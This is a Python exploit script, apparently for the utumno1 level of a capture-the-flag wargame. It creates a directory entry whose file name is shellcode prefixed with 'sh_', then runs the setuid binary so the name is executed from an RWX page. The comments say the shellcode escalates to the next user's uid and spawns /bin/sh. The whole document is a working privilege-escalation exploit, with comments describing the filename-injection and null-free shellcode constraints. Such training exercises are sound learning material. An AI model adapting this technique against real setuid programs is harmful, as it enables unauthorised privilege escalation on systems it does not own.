import os, sys

# ---------------------------------------------------------------------------
# utumno1 takes a DIRECTORY argument and walks its entries.  For an entry
# whose name starts with "sh_" it calls run(name+3), and run() does:
#     strncpy(mmap_rwx_page, name+3, 0x1000);
#     ((void (*)(void))mmap_rwx_page)();
# so the file NAME is the payload.  Two hard constraints follow:
#   * a file name cannot contain '/', so the shellcode cannot use the usual
#     push 0x68732f2f / push 0x6e69622f trick for "/bin/sh";
#   * strncpy stops at a NUL, so the shellcode cannot contain 0x00 either.
# L1.asm builds "/bin/sh" byte by byte ('/' comes from 0x2e + 1) and raises
# the uid to utumno2 with setreuid + setuid before execve.
# ---------------------------------------------------------------------------
sc = open("/tmp/ul1/l1.bin", "rb").read()
print("shellcode: %d bytes, contains '/': %s, contains NUL: %s"
      % (len(sc), b"/" in sc, b"\x00" in sc), flush=True)

name = b"sh_" + sc                      # d_name must start with sh_
d = b"/tmp/ul1/d"
try:
    os.mkdir(d)
except FileExistsError:
    pass
for f in os.listdir(d):                 # only our entry may be there
    os.unlink(os.path.join(d, f))
open(os.path.join(d, name), "wb").close()
print("created %s/%d-byte entry; it starts with sh_ so run() executes name+3"
      % (d.decode(), len(name)), flush=True)

os.execve(b"/utumno/utumno1", [b"/utumno/utumno1", d], {})
